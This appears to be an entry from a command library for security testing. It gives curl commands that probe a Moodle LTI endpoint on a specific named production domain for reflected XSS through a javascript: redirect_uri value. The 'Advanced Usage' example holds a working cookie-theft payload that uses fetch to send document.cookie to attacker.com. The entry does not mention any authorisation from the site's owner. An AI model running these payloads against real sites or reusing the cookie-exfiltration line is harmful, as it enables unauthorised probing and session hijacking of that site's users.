---
data: >-
  curl -i
  "https://evolve.glovoapp.com/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)"
tags:
  - web
  - xss
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e802416a-cf93-4528-98df-816bf7a8c5a7
created_at: '2025-12-13T23:52:39.009Z'
updated_at: '2025-12-13T23:52:39.009Z'
verified: false
validated: true
submitted: true
---
# test-moodle-xss-payload-with-curl

## Command

```bash
curl -i "https://evolve.glovoapp.com/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)"
```

## Description

This command fetches the response from the Moodle LTI endpoint with a javascript: payload in redirect_uri to verify if it's reflected without sanitization, prepping for browser-based XSS testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers and body | Yes |
| `redirect_uri` | XSS payload (e.g., javascript:alert(document.domain)) | Yes |

## Examples

### Basic Usage

```bash
curl -i "https://evolve.glovoapp.com/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)"
```

### Advanced Usage

```bash
curl -i "https://evolve.glovoapp.com/mod/lti/auth.php?redirect_uri=javascript:fetch('https://attacker.com?cookie='+document.cookie)" | grep -i javascript
```

(Grep for the reflected payload in the response.)

## Expected Output

Response body containing the unsanitized 'javascript:alert(document.domain)' string, confirming reflection for potential XSS.

## Related

- [[Related Procedure]]
